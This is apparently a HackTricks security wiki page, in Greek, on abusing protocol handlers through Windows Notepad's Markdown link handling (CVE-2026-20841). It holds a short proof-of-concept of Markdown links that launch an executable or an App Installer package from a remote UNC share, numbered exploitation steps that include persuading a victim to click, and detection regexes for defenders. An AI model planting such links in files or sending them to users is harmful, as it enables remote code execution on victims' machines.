# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Οι σύγχρονες εφαρμογές Windows που κάνουν render Markdown/HTML συχνά μετατρέπουν links που παρέχονται από τον χρήστη σε clickable στοιχεία και τα παραδίδουν στο `ShellExecuteExW`. Χωρίς αυστηρό allowlisting των schemes, οποιοσδήποτε καταχωρισμένος protocol handler (π.χ. `file:`, `ms-appinstaller:`) μπορεί να ενεργοποιηθεί, οδηγώντας σε code execution στο context του τρέχοντος χρήστη.<sup>[[1]](#references)</sup>

## Επιφάνεια ShellExecuteExW στο Markdown mode του Windows Notepad
- Το Notepad επιλέγει Markdown mode **μόνο για extensions `.md`** μέσω fixed string comparison στη `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Υποστηριζόμενα Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (γίνεται render ως `[target](target)`), επομένως και οι δύο syntaxes έχουν σημασία για payloads και detections.
- Τα clicks στα links υποβάλλονται σε επεξεργασία στη `sub_140170F60()`, η οποία εκτελεί weak filtering και στη συνέχεια καλεί το `ShellExecuteExW`.
- Το `ShellExecuteExW` κάνει dispatch σε **οποιονδήποτε configured protocol handler**, όχι μόνο σε HTTP(S).<sup>[[1]](#references)</sup>

### Payload considerations
- Όλες οι ακολουθίες `\\` στο link **κανονικοποιούνται σε `\`** πριν από το `ShellExecuteExW`, επηρεάζοντας το UNC/path crafting και το detection.
- Τα αρχεία `.md` **δεν είναι συσχετισμένα με το Notepad by default**· το victim πρέπει πρώτα να ανοίξει το αρχείο στο Notepad και να κάνει click στο link, όμως μετά το render το link είναι clickable.
- Επικίνδυνα παραδείγματα schemes:<sup>[[1]](#references)</sup>
- `file://` για εκκίνηση local/UNC payload.
- `ms-appinstaller://` για ενεργοποίηση App Installer flows. Άλλα locally registered schemes μπορεί επίσης να είναι abusable.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Ροή exploitation
1. Δημιουργήστε ένα **`.md` αρχείο**, ώστε το Notepad να το αποδώσει ως Markdown.
2. Ενσωματώστε έναν σύνδεσμο χρησιμοποιώντας ένα επικίνδυνο URI scheme (`file:`, `ms-appinstaller:` ή οποιοδήποτε εγκατεστημένο handler).
3. Παραδώστε το αρχείο (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ή παρόμοιο) και πείστε τον χρήστη να το ανοίξει στο Notepad.
4. Με το click, ο **normalized σύνδεσμος** παραδίδεται στο `ShellExecuteExW` και ο αντίστοιχος protocol handler εκτελεί το περιεχόμενο που αναφέρεται στο context του χρήστη.<sup>[[1]](#references)[[2]](#references)</sup>

## Ιδέες για detection
- Παρακολουθήστε μεταφορές αρχείων `.md` μέσω ports/protocols που χρησιμοποιούνται συνήθως για την παράδοση εγγράφων: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Αναλύστε Markdown links (standard και autolink) και αναζητήστε **case-insensitive** `file:` ή `ms-appinstaller:`.
- Regexes με καθοδήγηση από vendors για τον εντοπισμό πρόσβασης σε remote resources:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Η συμπεριφορά του patch reportedly **allowlists local files and HTTP(S)**· οτιδήποτε άλλο φτάνει στο `ShellExecuteExW` είναι ύποπτο. Επεκτείνετε τα detections και σε άλλους εγκατεστημένους protocol handlers, όπως απαιτείται, καθώς το attack surface διαφέρει ανά σύστημα.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Arbitrary Code Execution στο Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
